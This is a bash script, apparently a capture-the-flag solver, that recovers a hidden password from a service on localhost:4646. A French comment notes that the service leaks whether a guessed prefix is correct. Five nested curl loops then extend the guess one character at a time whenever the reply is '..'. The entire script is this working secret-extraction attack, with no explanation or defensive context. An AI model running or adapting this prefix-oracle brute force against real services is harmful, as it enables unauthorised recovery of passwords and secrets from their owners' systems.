#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-+@#$%^&*()[]{}|\\/?<>,.;:'\"\`~"

#reste sur .. juste avec ( donc go chercher le mdp avec x=(

for ((i=0; i<${#chars}; i++)); do
    char="${chars:$i:1}"
    result=$(curl -s "localhost:4646?x=$char&y=." 2>/dev/null)
    if [[ "$result" == ".." ]]; then
        echo "Found: $char"
        
        for ((j=0; j<${#chars}; j++)); do
            char2="${chars:$j:1}"
            result=$(curl -s "localhost:4646?x=$char$char2&y=." 2>/dev/null)
            if [[ "$result" == ".." ]]; then
                echo "Found: $char$char2"
                
                for ((k=0; k<${#chars}; k++)); do
                    char3="${chars:$k:1}"
                    result=$(curl -s "localhost:4646?x=$char$char2$char3&y=." 2>/dev/null)
                    if [[ "$result" == ".." ]]; then
                        echo "Found: $char$char2$char3"
                        
                        for ((l=0; l<${#chars}; l++)); do
                            char4="${chars:$l:1}"
                            result=$(curl -s "localhost:4646?x=$char$char2$char3$char4&y=." 2>/dev/null)
                            if [[ "$result" == ".." ]]; then
                                echo "Found: $char$char2$char3$char4"
                                
                                for ((m=0; m<${#chars}; m++)); do
                                    char5="${chars:$m:1}"
                                    result=$(curl -s "localhost:4646?x=$char$char2$char3$char4$char5&y=." 2>/dev/null)
                                    if [[ "$result" == ".." ]]; then
                                        echo "Found: $char$char2$char3$char4$char5"
                                    fi
                                done
                            fi
                        done
                    fi
                done
            fi
        done
    fi
done